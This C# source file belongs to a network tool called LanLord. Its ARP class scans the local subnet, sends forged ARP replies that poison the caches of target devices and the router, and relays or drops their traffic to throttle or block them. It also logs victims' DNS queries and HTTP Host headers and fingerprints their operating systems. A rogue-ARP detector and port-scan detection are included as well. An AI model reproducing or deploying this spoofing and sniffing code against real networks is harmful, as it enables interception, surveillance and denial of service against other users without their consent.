using PcapNet;
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

using System.Collections.Generic;
using System.Linq;

namespace LanLord
{
#pragma warning disable  // Falta el comentario XML para el tipo o miembro visible pblicamente
    public class CArp : IDisposable
    {
        private bool isListeningArp;

        private bool isRedirecting;

        private bool isDiscovering;

        private PcList pcList;

        private NetworkInterface nicNet;

        private CPcapNet pcaparp;

        // Dedicated send-only pcap handle for Spoof/UnSpoof/findMac.
        // pcaparp is receive-only (arpListenerThread); _pcaparpSend is write-only (any thread).
        // Keeping them separate eliminates concurrent pcap_next_ex + pcap_sendpacket on the
        // same pcap_t handle, which is not thread-safe in WinPcap/Npcap.
        private CPcapNet _pcaparpSend;

        private CPcapNet pcapredirect;

        private Thread arpListenerThread;

        private Thread redirectorThread;

        private Thread discoveringThread;

        private EventWaitHandle arpListenerThreadTerminated;

        private EventWaitHandle redirectorThreadTerminated;

        private EventWaitHandle discovererThreadTerminated;

        public byte[] localIP;

        public byte[] localMAC;

        public byte[] netmask;

        public byte[] routerIP;

        public byte[] routerMAC;

        public byte[] broadcastMac;

        public Action<int, int> OnScanProgress;

        public Action<PC, string> OnDnsQuery;

        public Action<PC, string> OnHttpHost;

        public Action<string, string> OnRogueArp;

        public Action<PC> OnPortScanDetected;

        // portScanStates[srcIP][dstIP] -> PortScanState; only accessed on redirector thread, no lock needed
        private Dictionary<string, Dictionary<string, PortScanState>> portScanStates =
            new Dictionary<string, Dictionary<string, PortScanState>>();

        private class PortScanState
        {
            public DateTime windowStart = DateTime.Now;
            public System.Collections.Generic.HashSet<int> ports = new System.Collections.Generic.HashSet<int>();
        }

        private void discoverer()
        {
            isDiscovering = true;

            // Compute the subnet range [start, end) for each octet.
            // blockSize = 256 - maskOctet; start = (ipOctet / blockSize) * blockSize
            int[] start = new int[4];
            int[] end = new int[4];
            for (int i = 0; i < 4; i++)
            {
                int blockSize = 256 - netmask[i];
                start[i] = (localIP[i] / blockSize) * blockSize;
                end[i] = start[i] + blockSize;
            }

            int total = (end[0] - start[0]) * (end[1] - start[1]) * (end[2] - start[2]) * (end[3] - start[3]);
            int scanned = 0;

            for (int a = start[0]; a < end[0]; a++)
            {
                for (int b = start[1]; b < end[1]; b++)
                {
                    for (int c = start[2]; c < end[2]; c++)
                    {
                        for (int d = start[3]; d < end[3]; d++)
                        {
                            if (!isDiscovering)
                            {
                                discovererThreadTerminated.Set();
                                return;
                            }
                            findMac(a + "." + b + "." + c + "." + d);
                            Thread.Sleep(5);
                            scanned++;
                            if (scanned % 16 == 0 && OnScanProgress != null)
                                OnScanProgress(scanned, total);
                        }
                    }
                }
            }

            if (OnScanProgress != null) OnScanProgress(total, total);
            isDiscovering = false;
            discovererThreadTerminated.Set();
        }

        private void redirector()
        {
            byte[] pkt_data = null;
            packet_headers pkt_hdr = null;
            isRedirecting = true;
            byte[] array = new byte[6];
            byte[] array2 = new byte[4];
            byte[] array3 = new byte[4];
            PC router = pcList.getRouter();
            if (router != null)
            {
                routerMAC = router.mac.GetAddressBytes();
            }
            if (routerMAC == null)
            {
                MessageBox.Show("No router found to redirect packet");
                isRedirecting = false;
                return;
            }
            if (isRedirecting)
            {
                do
                {
                    if (pcapredirect.pcapnet_next_ex(out pkt_hdr, out pkt_data) == 0)
                    {
                        continue;
                    }
                    Array.Copy(pkt_data, 6, array, 0, 6);
                    if (tools.areValuesEqual(array, localMAC))
                    {
                        Array.Copy(pkt_data, 26, array2, 0, 4);
                        if (tools.areValuesEqual(array2, localIP))
                        {
                            pcList.getLocalPC().nbPacketSentSinceLastReset += (int)pkt_hdr.caplen;
                        }
                        continue;
                    }
                    if (tools.areValuesEqual(array, routerMAC))
                    {
                        Array.Copy(pkt_data, 30, array3, 0, 4);
                        if (tools.areValuesEqual(array3, localIP))
                        {
                            pcList.getLocalPC().nbPacketReceivedSinceLastReset += (int)pkt_hdr.caplen;
                            continue;
                        }
                        PC pCFromIP = pcList.getPCFromIP(array3);
                        if (pCFromIP != null)
                        {
                            int capDown = pCFromIP.capDown;
                            if ((capDown == 0 || capDown > pCFromIP.nbPacketReceivedSinceLastReset) && pCFromIP.redirect)
                            {
                                Array.Copy(pCFromIP.mac.GetAddressBytes(), 0, pkt_data, 0, 6);
                                Array.Copy(localMAC, 0, pkt_data, 6, 6);
                                pcapredirect.pcapnet_sendpacket(pkt_data);
                                pCFromIP.nbPacketReceivedSinceLastReset += (int)pkt_hdr.caplen;
                            }
                        }
                        continue;
                    }
                    Array.Copy(pkt_data, 30, array3, 0, 4);
                    if (tools.areValuesEqual(array3, localIP))
                    {
                        continue;
                    }
                    PC pCFromMac = pcList.getPCFromMac(array);
                    if (pCFromMac != null)
                    {
                        // DNS sniffer: intercept queries from any spoofed device before forwarding decision
                        string dnsHost = parseDnsQuery(pkt_data);
                        if (dnsHost != null)
                        {
                            pCFromMac.lastDnsQuery = dnsHost;
                            Action<PC, string> dnsCallback = OnDnsQuery;
                            if (dnsCallback != null) dnsCallback(pCFromMac, dnsHost);
                        }
                        // HTTP Host sniffer: cleartext HTTP on port 80
                        string httpHost = parseHttpHost(pkt_data);
                        if (httpHost != null)
                        {
                            Action<PC, string> httpCallback = OnHttpHost;
                            if (httpCallback != null) httpCallback(pCFromMac, httpHost);
                        }
                        // Passive OS fingerprinting via TTL (uplink = packet from device)
                        if (pCFromMac.osGuess == null && pkt_data.Length > 22)
                        {
                            byte ttl = pkt_data[22];
                            string os;
                            if (ttl >= 200) os = "Network Device";
                            else if (ttl > 100) os = "Windows";
                            else if (ttl > 55) os = "Linux/Android/macOS";
                            else os = "iOS";
                            pCFromMac.osGuess = os + " (TTL=" + ttl + ")";
                        }
                        // Port scan detection: track unique dst ports per destination IP in a 10-second window
                        byte proto = pkt_data[23];
                        if ((proto == 6 || proto == 17) && pkt_data.Length >= 14 + (pkt_data[14] & 0x0F) * 4 + 4)
                        {
                            int ihlPs = (pkt_data[14] & 0x0F) * 4;
                            int tpOff = 14 + ihlPs;
                            string dstIp = pkt_data[30] + "." + pkt_data[31] + "." + pkt_data[32] + "." + pkt_data[33];
                            int dstPort = (pkt_data[tpOff + 2] << 8) | pkt_data[tpOff + 3];
                            string srcKey = pCFromMac.ip.ToString();
                            Dictionary<string, PortScanState> byDst;
                            if (!portScanStates.TryGetValue(srcKey, out byDst))
                            {
                                byDst = new Dictionary<string, PortScanState>();
                                portScanStates[srcKey] = byDst;
                            }
                            PortScanState state;
                            if (!byDst.TryGetValue(dstIp, out state))
                            {
                                state = new PortScanState();
                                byDst[dstIp] = state;
                            }
                            if ((DateTime.Now - state.windowStart).TotalSeconds > 10)
                            {
                                state.ports.Clear();
                                state.windowStart = DateTime.Now;
                            }
                            state.ports.Add(dstPort);
                            if (state.ports.Count >= 15 && !pCFromMac.isSuspectedScanner)
                            {
                                pCFromMac.isSuspectedScanner = true;
                                Action<PC> scanCallback = OnPortScanDetected;
                                if (scanCallback != null) scanCallback(pCFromMac);
                            }
                        }
                        int capUp = pCFromMac.capUp;
                        if ((capUp == 0 || capUp > pCFromMac.nbPacketSentSinceLastReset) && pCFromMac.redirect)
                        {
                            Array.Copy(routerMAC, 0, pkt_data, 0, 6);
                            Array.Copy(localMAC, 0, pkt_data, 6, 6);
                            pcapredirect.pcapnet_sendpacket(pkt_data);
                            pCFromMac.nbPacketSentSinceLastReset += (int)pkt_hdr.caplen;
                        }
                    }
                }
                while (isRedirecting);
            }
            redirectorThreadTerminated.Set();
        }

        private void arpListener()
        {
            byte[] pkt_data = null;
            packet_headers pkt_hdr = null;
            isListeningArp = true;
            do
            {
                if (pcaparp.pcapnet_next_ex(out pkt_hdr, out pkt_data) == 0)
                {
                    continue;
                }
                byte[] array = new byte[6];
                Array.Copy(pkt_data, 6, array, 0, 6);
                if (tools.areValuesEqual(array, localMAC))
                {
                    continue;
                }
                byte b = pkt_data[21];
                if (b == 2)
                {
                    byte[] array2 = new byte[4];
                    byte[] array3 = new byte[6];
                    Array.Copy(pkt_data, 22, array3, 0, 6);
                    Array.Copy(pkt_data, 28, array2, 0, 4);
                    PC pC = new PC();
                    pC.ip = new IPAddress(array2);
                    pC.mac = new PhysicalAddress(array3);
                    pC.capDown = 0;
                    pC.capUp = 0;
                    pC.isLocalPc = false;
                    pC.name = "";
                    pC.nbPacketReceivedSinceLastReset = 0;
                    pC.nbPacketSentSinceLastReset = 0;
                    pC.redirect = true;
                    DateTime now = DateTime.Now;
                    pC.timeSinceLastRarp = now;
                    pC.totalPacketReceived = 0;
                    pC.totalPacketSent = 0;
                    if (tools.areValuesEqual(array2, routerIP))
                    {
                        routerMAC = array;
                        pC.isGateway = true;
                    }
                    else
                    {
                        pC.isGateway = false;
                    }
                    pcList.addPcToList(pC);
                }
                // Rogue ARP detector: another machine claiming to be the router
                // Fires if ARP reply sender IP == router IP but sender MAC is not the real router and not our own MAC
                if (b == 2 && routerIP != null && routerMAC != null)
                {
                    byte[] senderMac = new byte[6];
                    byte[] senderIp = new byte[4];
                    Array.Copy(pkt_data, 22, senderMac, 0, 6);
                    Array.Copy(pkt_data, 28, senderIp, 0, 4);
                    if (tools.areValuesEqual(senderIp, routerIP)
                        && !tools.areValuesEqual(senderMac, routerMAC)
                        && !tools.areValuesEqual(senderMac, localMAC))
                    {
                        string rogueMac = BitConverter.ToString(senderMac).Replace("-", ":");
                        string claimedIp = new IPAddress(senderIp).ToString();
                        Action<string, string> cb = OnRogueArp;
                        if (cb != null) cb(rogueMac, claimedIp);
                    }
                }
            }
            while (isListeningArp);
            arpListenerThreadTerminated.Set();
        }

        public CArp(NetworkInterface nic, PcList pclist)
        {
            pcList = pclist;
            nicNet = nic;
            int num = 0;
            if (0 < nic.GetIPProperties().UnicastAddresses.Count)
            {
                do
                {
                    if (!Convert.ToString(nicNet.GetIPProperties().UnicastAddresses[num].Address.AddressFamily).EndsWith("V6"))
                    {
                        localIP = nicNet.GetIPProperties().UnicastAddresses[num].Address.GetAddressBytes();
                        netmask = nicNet.GetIPProperties().UnicastAddresses[num].IPv4Mask.GetAddressBytes();
                    }
                    num++;
                }
                while (num < nicNet.GetIPProperties().UnicastAddresses.Count);
            }
            localMAC = nicNet.GetPhysicalAddress().GetAddressBytes();
            if (nicNet.GetIPProperties().GatewayAddresses.Count > 0)
            {
                routerIP = nicNet.GetIPProperties().GatewayAddresses[0].Address.GetAddressBytes();
            }
            byte[] array = broadcastMac = new byte[6];
            int num2 = 0;
            do
            {
                array[num2] = byte.MaxValue;
                num2++;
            }
            while (num2 < 6);
            pcaparp = new CPcapNet();
            _pcaparpSend = new CPcapNet();
            pcapredirect = new CPcapNet();
            arpListenerThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
            redirectorThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
            discovererThreadTerminated = new EventWaitHandle(false, EventResetMode.AutoReset);
            isListeningArp = false;
            isDiscovering = false;
            isRedirecting = false;
        }

        public void PCArp()
        {
            if (isDiscovering)
            {
                isDiscovering = false;
                discovererThreadTerminated.WaitOne();
            }
            if (isListeningArp)
            {
                isListeningArp = false;
                arpListenerThreadTerminated.WaitOne();
            }
            if (isRedirecting)
            {
                isRedirecting = false;
                redirectorThreadTerminated.WaitOne();
            }
            completeUnspoof();
            _pcaparpSend.Dispose();
        }

        public void Spoof(IPAddress ip1, IPAddress ip2)
        {
            PC pCFromIP = pcList.getPCFromIP(ip1.GetAddressBytes());
            PC pCFromIP2 = pcList.getPCFromIP(ip2.GetAddressBytes());
            if (pCFromIP != null && pCFromIP2 != null)
            {
                // Packet 1: tell the target device that the router is at localMAC
                byte[] array = localMAC;
                _pcaparpSend.pcapnet_sendpacket(buildArpPacket(pCFromIP.mac.GetAddressBytes(), array, 2, array, pCFromIP2.ip.GetAddressBytes(), pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes()));
                // Packet 2: tell the router that the target device is at localMAC
                byte[] array2 = localMAC;
                _pcaparpSend.pcapnet_sendpacket(buildArpPacket(pCFromIP2.mac.GetAddressBytes(), array2, 2, array2, pCFromIP.ip.GetAddressBytes(), pCFromIP2.mac.GetAddressBytes(), pCFromIP2.ip.GetAddressBytes()));
                // NOTE: former packets 3 & 4 sent frames with Ethernet src = router_MAC
                // from LanLord's NIC, which caused the switch's CAM table to map router_MAC
                // to LanLord's port. All traffic to the router was then mis-switched back to
                // LanLord, breaking LanLord's own internet. The OS ARP cache for the router
                // is maintained naturally; no extra frames are needed.
            }
        }

        public void UnSpoof(IPAddress ip1, IPAddress ip2)
        {
            PC pCFromIP = pcList.getPCFromIP(ip1.GetAddressBytes());
            PC pCFromIP2 = pcList.getPCFromIP(ip2.GetAddressBytes());
            if (pCFromIP != null && pCFromIP2 != null)
            {
                // Use localMAC as Ethernet src so the switch's CAM table is never corrupted
                // with a forged router/victim MAC pointing to our port.
                // The ARP payload sender fields are what actually update the recipients' ARP caches.
                _pcaparpSend.pcapnet_sendpacket(buildArpPacket(pCFromIP.mac.GetAddressBytes(), localMAC, 1, pCFromIP2.mac.GetAddressBytes(), pCFromIP2.ip.GetAddressBytes(), broadcastMac, pCFromIP.ip.GetAddressBytes()));
                _pcaparpSend.pcapnet_sendpacket(buildArpPacket(pCFromIP2.mac.GetAddressBytes(), localMAC, 1, pCFromIP.mac.GetAddressBytes(), pCFromIP.ip.GetAddressBytes(), broadcastMac, pCFromIP2.ip.GetAddressBytes()));
            }
        }

        public void findMacRouter()
        {
            findMac(new IPAddress(routerIP).ToString());
        }

        public void findMac(string ip)
        {
            string text = null;
            if (pcaparp.nicHandle == IntPtr.Zero && !pcaparp.pcapnet_openLive(nicNet.Id, 65535, 0, 1, text))
            {
                MessageBox.Show(text);
                return;
            }
            if (_pcaparpSend.nicHandle == IntPtr.Zero && !_pcaparpSend.pcapnet_openLive(nicNet.Id, 65535, 0, 1, text))
            {
                MessageBox.Show(text);
                return;
            }
            byte[] addressBytes = tools.getIpAddress(ip).GetAddressBytes();
            byte[] array = broadcastMac;
            byte[] array2 = localMAC;
            _pcaparpSend.pcapnet_sendpacket(buildArpPacket(array, array2, 1, array2, localIP, array, addressBytes));
        }

        public int startRedirector()
        {
            string text = null;
            if (pcapredirect.nicHandle == IntPtr.Zero && !pcapredirect.pcapnet_openLive(nicNet.Id, 65535, 0, 1, text))
            {
                MessageBox.Show(text);
                return -1;
            }
            if (pcapredirect.pcapnet_setFilter("ip", uint.MaxValue) != 0)
            {
                return -2;
            }
            if (!isRedirecting)
            {
                (redirectorThread = new Thread(redirector)).Start();
            }
            return 0;
        }

        public void stopRedirector()
        {
            if (isRedirecting)
            {
                isRedirecting = false;
                redirectorThreadTerminated.WaitOne();
            }
        }

        public int startArpListener()
        {
            string text = null;
            if (pcaparp.nicHandle == IntPtr.Zero && !pcaparp.pcapnet_openLive(nicNet.Id, 65535, 0, 1, text))
            {
                MessageBox.Show(text);
                return -1;
            }
            if (pcaparp.pcapnet_setFilter("arp", uint.MaxValue) != 0)
            {
                return -2;
            }
            if (!isListeningArp)
            {
                (arpListenerThread = new Thread(arpListener)).Start();
            }
            return 0;
        }

        public void stopArpListener()
        {
            if (isListeningArp)
            {
                isListeningArp = false;
                arpListenerThreadTerminated.WaitOne();
            }
        }

        public int startArpDiscovery()
        {
            string text = null;
            if (pcaparp.nicHandle == IntPtr.Zero && !pcaparp.pcapnet_openLive(nicNet.Id, 65535, 0, 1, text))
            {
                MessageBox.Show(text);
                return -1;
            }
            if (!isDiscovering)
            {
                (discoveringThread = new Thread(discoverer)).Start();
            }
            return 0;
        }

        public void stopArpDiscovery()
        {
            if (isDiscovering)
            {
                isDiscovering = false;
                discovererThreadTerminated.WaitOne();
            }
        }

        public void completeUnspoof()
        {
            PC router = pcList.getRouter();
            if (router == null)
            {
                return;
            }
            int num = 0;
            if (0 < pcList.pclist.Count)
            {
                do
                {
                    UnSpoof(pcList.pclist[num].ip, router.ip);
                    num++;
                }
                while (num < pcList.pclist.Count);
            }
        }

        /// <summary>
        /// Forcibly block or unblock a device.
        /// When blocking: sets isBlocked=true, disables forwarding, and immediately
        /// re-poisons the device's ARP cache so all traffic routes through us and is dropped.
        /// When unblocking: restores forwarding so packets are relayed normally.
        /// </summary>
        public void SetBlocked(PC pc, bool blocked)
        {
            Monitor.Enter((object)pc);
            pc.isBlocked = blocked;
            pc.redirect = !blocked;
            Monitor.Exit((object)pc);
            // Force an immediate spoof so the device's ARP table is poisoned right away
            if (blocked && routerIP != null)
                Spoof(pc.ip, new IPAddress(routerIP));
        }

        /// <summary>
        /// Parses a raw Ethernet frame and returns the first DNS question name if the
        /// packet is a UDP DNS query (dst port 53, QR=0).  Returns null otherwise.
        /// Handles variable-length IP headers (IHL field).  No compression expected
        /// in query question sections.
        /// </summary>
        private string parseHttpHost(byte[] pkt)
        {
            // Minimum: 14 (Eth) + 20 (IP) + 20 (TCP min) = 54
            if (pkt == null || pkt.Length < 54) return null;
            if (pkt[12] != 0x08 || pkt[13] != 0x00) return null; // IPv4
            if (pkt[23] != 6) return null;                        // TCP
            int ihl = (pkt[14] & 0x0F) * 4;
            int tcpOff = 14 + ihl;
            if (pkt.Length < tcpOff + 14) return null;
            // TCP destination port must be 80
            int dstPort = (pkt[tcpOff + 2] << 8) | pkt[tcpOff + 3];
            if (dstPort != 80) return null;
            // TCP data offset
            int tcpDataLen = ((pkt[tcpOff + 12] >> 4) & 0x0F) * 4;
            int payloadOff = tcpOff + tcpDataLen;
            int payloadLen = pkt.Length - payloadOff;
            if (payloadLen < 6) return null;
            // Decode up to 512 bytes of payload as ASCII
            string payload = System.Text.Encoding.ASCII.GetString(pkt, payloadOff, Math.Min(512, payloadLen));
            int idx = payload.IndexOf("Host:", StringComparison.OrdinalIgnoreCase);
            if (idx < 0) return null;
            int start = idx + 5;
            while (start < payload.Length && payload[start] == ' ') start++;
            int end = payload.IndexOf('\r', start);
            if (end < 0) end = payload.IndexOf('\n', start);
            if (end < 0) end = Math.Min(start + 128, payload.Length);
            string host = payload.Substring(start, end - start).Trim();
            return host.Length > 0 ? host : null;
        }

        private string parseDnsQuery(byte[] pkt)
        {
            // Minimum: 14 (Eth) + 20 (IP) + 8 (UDP) + 12 (DNS hdr) + 1 (root label) = 55
            if (pkt == null || pkt.Length < 55) return null;
            // EtherType must be IPv4 (0x0800)
            if (pkt[12] != 0x08 || pkt[13] != 0x00) return null;
            // IP protocol must be UDP (17)
            if (pkt[23] != 17) return null;
            // IP header length from IHL nibble (bytes, variable)
            int ihl = (pkt[14] & 0x0F) * 4;
            int udpOffset = 14 + ihl;
            if (pkt.Length < udpOffset + 8 + 13) return null;
            // UDP destination port must be 53
            int dstPort = (pkt[udpOffset + 2] << 8) | pkt[udpOffset + 3];
            if (dstPort != 53) return null;
            // DNS payload offset
            int dns = udpOffset + 8;
            if (pkt.Length < dns + 12) return null;
            // QR flag (bit 7 of flags high byte): 0 = query, 1 = response
            if ((pkt[dns + 2] & 0x80) != 0) return null;
            // QDCOUNT must be at least 1
            int qdCount = (pkt[dns + 4] << 8) | pkt[dns + 5];
            if (qdCount == 0) return null;
            // Parse QNAME starting right after the 12-byte DNS header
            int pos = dns + 12;
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            int safetyLimit = 128; // avoid runaway on malformed packets
            while (pos < pkt.Length && safetyLimit-- > 0)
            {
                byte labelLen = pkt[pos++];
                if (labelLen == 0) break;
                // Compression pointers (0xC0 prefix) should not appear in queries but guard anyway
                if ((labelLen & 0xC0) == 0xC0) break;
                if (sb.Length > 0) sb.Append('.');
                for (int i = 0; i < labelLen && pos < pkt.Length; i++)
                    sb.Append((char)pkt[pos++]);
            }
            string result = sb.ToString();
            return result.Length > 0 ? result : null;
        }

        public byte[] buildArpPacket(byte[] destMac, byte[] srcMac, short arpType, byte[] arpSrcMac, byte[] arpSrcIp, byte[] arpDestMac, byte[] arpDestIP)
        {
            byte[] array = new byte[42];
            Array.Copy(destMac, 0, array, 0, 6);
            Array.Copy(srcMac, 0, array, 6, 6);
            array[12] = 8;
            array[13] = 6;
            array[14] = 0;
            array[15] = 1;
            array[16] = 8;
            array[17] = 0;
            array[18] = 6;
            array[19] = 4;
            array[20] = 0;
            array[21] = (byte)arpType;
            Array.Copy(arpSrcMac, 0, array, 22, 6);
            Array.Copy(arpSrcIp, 0, array, 28, 4);
            Array.Copy(arpDestMac, 0, array, 32, 6);
            Array.Copy(arpDestIP, 0, array, 38, 4);
            return array;
        }

        protected virtual void Dispose([MarshalAs(UnmanagedType.U1)] bool P_0)
        {
            if (P_0)
            {
                PCArp();
            }
            else
            {

            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
    }
#pragma warning restore  // Falta el comentario XML para el tipo o miembro visible p�blicamente
}
